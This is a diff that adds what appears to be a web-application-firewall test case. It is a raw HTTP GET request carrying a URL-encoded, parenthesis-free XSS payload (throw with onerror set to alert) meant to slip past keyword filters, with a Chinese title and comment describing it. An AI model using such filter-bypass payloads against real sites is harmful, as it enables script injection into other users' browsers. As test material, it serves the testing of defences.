@@ -1,0 +1,9 @@
+# XSS跨站脚本_GET_事件_关键字替换类(无括号绕过)-06506695
+# 该攻击脚本的主要目的是抛出一个异常，异常类型为 1，同时将 onerror 属性的值设置为 alert
+GET /?id=%3Cscript%3Ethrow%5Bonerror%5D=%5Balert%5D%2C1%3C%2Fscript%3E&bid=hd_tag_m8mv25pl HTTP/1.1
+Host: www.swaf.com
+RM-PRO-BusinessID: hd_tag_m8mv25pl
+RM-PRO-Token: a35b4af071b817cdc25c208fac2ec91a
+RM-PRO-Time: 1742808499241
+User-Agent: curl/7.83.1
+
